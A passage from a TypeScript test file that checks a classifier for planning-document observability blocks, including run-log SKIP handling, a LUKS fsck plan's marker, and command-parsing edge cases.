  });

  test("a valid run-log NEVER invokes the runner (there is nothing to run yet)", async () => {
    let invoked = 0;
    const result = await classifyDiscoverabilityResult({
      planPath: "fixtures/09-run-log-pass.md",
      planBody: fx("09-run-log-pass.md"),
      prBody: "knowledge-base/project/plans/fixtures/09-run-log-pass.md",
      runner: async () => {
        invoked += 1;
        return { rc: 0, stdout: "" } as ExecResult;
      },
      markerLookup: () => true,
    });
    expect(invoked).toBe(0);
    expect(result.result).toBe("SKIP");
  });

  test("run-log SKIP is never a PASS — the gate does not certify what it did not observe", async () => {
    const result = await classify(fx("09-run-log-pass.md"), {
      markerLookup: () => true,
    });
    expect(result.result).not.toBe("PASS");
  });
});

describe("The LUKS plan (#6774's motivating case) now classifies as run-log SKIP", () => {
  const LUKS_PLAN = join(
    import.meta.dir,
    "..",
    "..",
    "..",
    "knowledge-base",
    "project",
    "plans",
    "2026-07-20-fix-workspaces-luks-fsck-gate-differential-evidence-plan.md",
  );

  test("its Observability block declares run-log + the SOLEUR_WORKSPACES_LUKS_FSCK marker", async () => {
    const planBody = readFileSync(LUKS_PLAN, { encoding: "utf8" });
    const block = extractObservabilityBlock(planBody);
    expect(parseKind(block)).toBe("run-log");
    expect(parseMarker(block)).toBe("SOLEUR_WORKSPACES_LUKS_FSCK");
  });

  test("expected_output is no longer captured as the literal folded-scalar indicator", () => {
    const planBody = readFileSync(LUKS_PLAN, { encoding: "utf8" });
    const expected = parseExpected(extractObservabilityBlock(planBody));
    expect(expected).not.toBe(">-");
    expect(expected.length).toBeGreaterThan(10);
  });

  test("classifies SKIP (was a false FAIL) when the emitter is present", async () => {
    const planBody = readFileSync(LUKS_PLAN, { encoding: "utf8" });
    const result = await classifyDiscoverabilityResult({
      planPath: "knowledge-base/project/plans/2026-07-20-fix-workspaces-luks-fsck-gate-differential-evidence-plan.md",
      planBody,
      prBody: "knowledge-base/project/plans/2026-07-20-fix-workspaces-luks-fsck-gate-differential-evidence-plan.md",
      runner: stubExecutor(0, ""),
      markerLookup: () => true,
    });
    expect(result.result).toBe("SKIP");
    expect(result.marker).toBe("SOLEUR_WORKSPACES_LUKS_FSCK");
  });

  test("its marker really is emitted in the tree outside planning artifacts (guardrail 4, for real)", () => {
    // Not a stub: this is the actual non-vacuous lookup the runtime performs.
    const out = Bun.spawnSync([
      "git",
      "grep",
      "-l",
      "-F",
      "--",
      "SOLEUR_WORKSPACES_LUKS_FSCK",
      "--",
      ":!knowledge-base/project/plans",
      ":!knowledge-base/project/specs",
    ]).stdout.toString();
    expect(out.trim().length).toBeGreaterThan(0);
    expect(out).toMatch(/apps\/web-platform\/infra\//);
  });
});

describe("Edge cases discovered in review", () => {
  test("empty Form A block scalar (`command: |` with no continuation) returns empty", () => {
    const block = ["discoverability_test:", "  command: |", ""].join("\n");
    expect(parseCommand(block)).toBe("");
  });

  test("Form B fence with leading `# comment` lines strips comments and keeps real command", () => {
    const block = [
      "## Observability",
      "",
      "- **discoverability_test.command:**",
      "  ```bash",
      "  # Run from operator workstation (NO SSH).",
      "  curl -fsS https://app.soleur.ai/api/inngest",
      "  ```",
      "  Expected output: `200`",
    ].join("\n");
    expect(parseCommand(block)).toMatch(/^curl/);
    expect(parseCommand(block)).not.toMatch(/^#/);
  });
});
